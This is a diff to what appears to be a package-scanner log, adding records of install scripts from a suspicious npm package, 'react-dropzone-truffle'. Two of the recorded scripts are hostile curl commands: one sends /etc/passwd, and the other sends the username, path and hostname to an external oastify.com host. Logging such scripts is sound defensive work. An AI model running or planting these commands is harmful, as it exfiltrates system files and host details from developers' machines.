@@ -1,5 +1,25 @@
 [
   {
+    "packageName": "react-dropzone-truffle",
+    "version": "100.27.9",
+    "scriptType": "postinstall",
+    "scriptContent": "/usr/bin/curl --data '@/etc/passwd' $(hostname).gvfzzmw0upeudfwz4yf7f4byepkt8lwa.oastify.com",
+    "previousVersion": "100.25.9",
+    "timestamp": "2026-02-19T10:53:38.717Z",
+    "issuesend": false,
+    "suspicionScore": 20
+  },
+  {
+    "packageName": "react-dropzone-truffle",
+    "version": "100.27.9",
+    "scriptType": "preinstall",
+    "scriptContent": "C:\\Windows\\System32\\curl.exe \"https://gvfzzmw0upeudfwz4yf7f4byepkt8lwa.oastify.com?user=%USERNAME%&path=%CD%&hostname=%COMPUTERNAME%\"",
+    "previousVersion": "100.25.9",
+    "timestamp": "2026-02-19T10:53:38.713Z",
+    "issuesend": false,
+    "suspicionScore": 2
+  },
+  {
     "packageName": "orcastrator",
     "version": "0.1.1",
     "scriptType": "postbuild",
